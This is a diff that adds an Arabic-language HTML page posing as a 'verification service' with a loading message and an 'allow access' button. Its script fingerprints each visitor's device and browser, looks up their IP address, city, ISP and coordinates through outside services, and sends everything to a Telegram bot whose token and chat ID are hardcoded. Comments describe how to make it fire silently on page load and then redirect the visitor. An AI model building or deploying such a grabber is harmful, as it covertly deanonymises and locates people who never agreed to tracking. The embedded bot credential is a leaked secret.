@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>خدمة التحقق</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+        .container { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>جاري تحميل المحتوى...</h2>
+    <button onclick="sendData()">السماح بالوصول</button>
+</div>
+
+<script>
+    // جمع جميع المعلومات الممكنة عن الزائر
+    function collectData() {
+        let data = {
+            // معلومات المتصفح والجهاز
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            
+            // معلومات الشاشة
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            screenColorDepth: screen.colorDepth,
+            windowInnerWidth: window.innerWidth,
+            windowInnerHeight: window.innerHeight,
+            
+            // معلومات الوقت والمنطقة
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            localTime: new Date().toString(),
+            
+            // معلومات الشبكة (تقريبية)
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : 'غير متاح',
+            
+            // معلومات IP والجغرافيا (ستجلب من API خارجي)
+            ip: '',
+            city: '',
+            region: '',
+            country: '',
+            isp: '',
+            
+            // معلومات إضافية
+            referrer: document.referrer || 'مباشر',
+            url: window.location.href,
+            pageTitle: document.title
+        };
+        return data;
+    }
+    
+    // جلب IP والموقع عبر خدمة خارجية
+    async function fetchGeoIP() {
+        try {
+            // استخدام api.ipify.org للحصول على IP ثم ip-api.com للموقع
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+            
+            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon,query`);
+            const geo = await geoRes.json();
+            
+            return {
+                ip: geo.query || ip,
+                city: geo.city || 'غير معروف',
+                region: geo.regionName || 'غير معروف',
+                country: geo.country || 'غير معروف',
+                isp: geo.isp || 'غير معروف',
+                lat: geo.lat || '',
+                lon: geo.lon || ''
+            };
+        } catch(e) {
+            return {
+                ip: 'فشل الجلب',
+                city: 'فشل',
+                region: 'فشل',
+                country: 'فشل',
+                isp: 'فشل'
+            };
+        }
+    }
+    
+    // إرسال البيانات إلى خادم Telegram (بديل عن خادمك الخاص)
+    // يمكنك استبدال BOT_TOKEN و CHAT_ID ببيانات بوت تليجرام خاص بك
+    async function sendToTelegram(data) {
+        const BOT_TOKEN = '8555051309:AAGnEuz9QQVmHvBvSEs9XItpxpCP0Mr3ANo';  // استبدل بتوكن البوت الخاص بك
+        const CHAT_ID = '8816749155 ';      // استبدل بمعرف المحادثة الخاص بك
+        
+        const message = `🔍 معلومات زائر جديد:
+🌐 IP: ${data.ip}
+📍 الدولة: ${data.country}
+🏙️ المدينة: ${data.city}
+📡 مزود الخدمة: ${data.isp}
+💻 المتصفح: ${data.userAgent.substring(0, 200)}
+🗣️ اللغة: ${data.language}
+🖥️ النظام: ${data.platform}
+📱 دقة الشاشة: ${data.screenWidth}x${data.screenHeight}
+⏰ الوقت المحلي: ${data.localTime}
+🌍 المنطقة الزمنية: ${data.timezone}
+🔗 الصفحة: ${data.url}
+📎 الرابط السابق: ${data.referrer}
+⚡ سرعة النت: ${data.connection.downlink || 'غير معروف'} Mbps
+🧠 ذاكرة الجهاز: ${data.deviceMemory} GB
+🕒 وقت الإرسال: ${new Date().toString()}`;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            return await response.json();
+        } catch(e) {
+            console.error('فشل الإرسال إلى تليجرام', e);
+            return null;
+        }
+    }
+    
+    // إرسال البيانات إلى خادم Webhook خاص بك (بديل)
+    async function sendToYourServer(data) {
+        // استبدل YOUR_WEBHOOK_URL بعنوان الخادم الذي تديره أنت
+        const YOUR_WEBHOOK_URL = 'https://your-server.com/collect'; // غير هذا الرابط
+        
+        try {
+            const response = await fetch(YOUR_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            return await response.json();
+        } catch(e) {
+            console.error('فشل الإرسال إلى الخادم الخاص', e);
+            return null;
+        }
+    }
+    
+    // الوظيفة الرئيسية
+    async function sendData() {
+        const button = document.querySelector('button');
+        button.innerText = 'جاري الإرسال...';
+        button.disabled = true;
+        
+        let data = collectData();
+        const geo = await fetchGeoIP();
+        data = {...data, ...geo};
+        
+        // إرسال إلى تليجرام (إذا ضبطت التوكن)
+        if (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+            await sendToTelegram(data);
+        }
+        
+        // إرسال إلى خادمك الخاص (إذا ضبطت الرابط)
+        // await sendToYourServer(data);
+        
+        // تخزين البيانات محلياً أيضاً
+        localStorage.setItem('visitor_data', JSON.stringify(data));
+        
+        button.innerText = 'تم الإرسال - سيتم تحويلك قريباً';
+        
+        // يمكنك إعادة توجيه الزائر إلى أي موقع بعد جمع البيانات
+        // setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
+    }
+    
+    // جمع البيانات تلقائياً عند دخول الصفحة دون نقرة زر
+    // لإرسال فوري بدون تفاعل، قم بإلغاء تعليق السطر التالي:
+    // sendData();
+    
+    // عرض زر للمستخدم
+    console.log('الصفحة جاهزة - انتظر إشارة "f" من المشغل');
+</script>
+</body>
+</html>
